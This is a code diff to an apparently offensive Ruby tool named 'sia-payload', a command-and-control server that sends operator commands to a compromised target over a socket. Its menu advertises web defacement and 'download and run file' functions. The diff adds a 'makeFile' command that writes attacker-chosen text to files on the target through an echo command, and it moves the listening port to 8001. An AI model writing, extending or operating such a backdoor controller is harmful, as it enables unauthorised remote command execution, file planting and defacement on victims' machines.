@@ -63,11 +63,12 @@ puts """
                       siahack     =>   Show your deface webpage
                       download    =>   Download file(config url in payload.rb file)
                       down-run    =>   Download and run file(config url in payload.rb file)
+                      makeFile    =>   Making file
                       
 """
 
 
-port = 81
+port = 8001
 puts "#{HC}#{FGRN}[+] Starting Server at port : #{port} #{RS}"
 time = Time.now
 puts "#{HC}#{FGRN}[+] Start at : #{time}#{RS}"
@@ -84,6 +85,21 @@ loop {                          # Servers run forever
       #client.puts(com)
 
       while com = Readline.readline("\n#{BOLD}[+] #{PURPLE}root@sia-payload#{DARK_BLUE}:~# #{RS}", true)
+        #make file in target system
+        if com == "makeFile"
+          name_file = Readline.readline("\n#{BOLD}[+] Enter your File name : #{RS}", true)
+          text_file = Readline.readline("\n#{BOLD}[+] Enter your Text : #{RS}", true)
+
+          if RUBY_PLATFORM =~ /win32/
+
+          else
+            finish_com = "echo #{text_file} > #{name_file}"
+            #send to target
+            client.puts(finish_com)
+          end
+
+        end
+
         client.puts(com)
         puts "\n+------------------------------------------------------------+"
         #res = client.recv(10000).red
